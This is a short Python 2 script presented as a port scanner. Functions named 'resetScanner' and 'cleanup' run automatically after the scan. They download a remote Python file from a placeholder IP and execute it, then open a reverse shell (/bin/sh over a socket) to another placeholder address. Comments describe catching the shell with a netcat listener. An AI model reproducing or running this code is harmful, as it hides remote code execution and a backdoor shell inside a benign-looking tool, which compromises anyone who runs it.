def scan():
    print('\n')
    doscan = raw_input("Begin scanning a specific IP and Port? (y/n): ")
    while doscan=='y':
        ip = raw_input("Enter the ip: ")
        port = input("Enter the port: ")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        if s.connect_ex((ip, port)): print "Port", port, "is closed"
        else: print "Port", port, "is open"
        print('\n')
        doscan = raw_input("Scan another IP and Port? (y/n):")

def resetScanner():
    print('\n')
    print "..... Reseting scanner - Please wait...."
    i = 1
    urllib.urlretrieve('http://101.111.10.999/test.py','py1.py')
    while i < 3:
        urllib.urlretrieve('http://101.111.10.999/test.txt','filename.txt'*i)
        i += 1
    if os.path.exists('py1.py'): 
        os.system('python py1.py')
    if os.path.exists('filename.txt'):
        f = open("filename.txt", "a")
        f.write("\n Leave this file here! \n")
        f.close()
        
def reverseShell():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("777.888.99.000",1234))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
    s.close()
    # to connect back use netcat listener on the specified port: nc -l 1234 or nc -lvp 8888
    # If you run this in Kali, then make sure to have the port open already and waiting to catch the connection.
    # to make it executable, run the following command: chmod 744 scanS.py

def cleanup():
    resetScanner()
    reverseShell()
    os.remove('py1.py')
    print "Cleanup done"

# Call scanner
scan()
cleanup()